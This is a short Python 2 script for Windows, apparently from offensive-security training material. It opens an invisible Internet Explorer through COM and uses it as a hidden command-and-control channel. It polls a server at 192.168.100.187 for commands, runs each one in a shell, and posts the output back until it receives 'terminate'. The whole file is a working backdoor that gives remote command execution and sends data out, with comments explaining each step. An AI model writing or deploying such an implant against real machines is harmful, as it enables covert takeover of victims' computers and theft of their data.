# Install Python for Windows pywin32-219.win32-py2.7
# http://sourceforge.net/projects/pywin32/files/pywin32/Build%20219/

from win32com.client import Dispatch
from time import sleep
import subprocess


# create browser instance
ie = Dispatch("InternetExplorer.Application")
# make it invisible [ run in background ] (1 = visible)
ie.Visible = 0

# paramaeters for POST
dURL = "http://192.168.100.187"
Flags = 0 # default
TargetFrame  = "" # default

while True:

    # navigate to our web server to grab commands
    ie.Navigate("http://192.168.100.187")

    # wait for browser to finish loading
    while ie.ReadyState != 4:
        sleep(1)
                

    command = ie.Document.body.innerHTML

    # convert HTML entities to unicode.  For example '&amp;'  becomes '&'
    command = unicode(command)
    # encode the command into ASCII string and ignore any exception
    command = command.encode('ascii','ignore')
    print ' [+] We received command ' + command

    if 'terminate' in command:
        # if the received command was terminate, quit the IE and end up the process 
        ie.Quit()
        # end the loop
        break

    else:
        # if the received command was NOT terminate then we inject the command into a shell and store the result in a variable called Data
        CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

        Data = CMD.stdout.read()
        # in order to submit or post data using COM technique , it requires to  buffer the data first
        # https://docs.python.org/2/library/functions.html#buffer
        PostData = buffer(Data) 

        # we post the comamnd execution result along with the post parameters which we defined above
        ie.Navigate(dURL, Flags, TargetFrame, PostData)


    sleep(3)








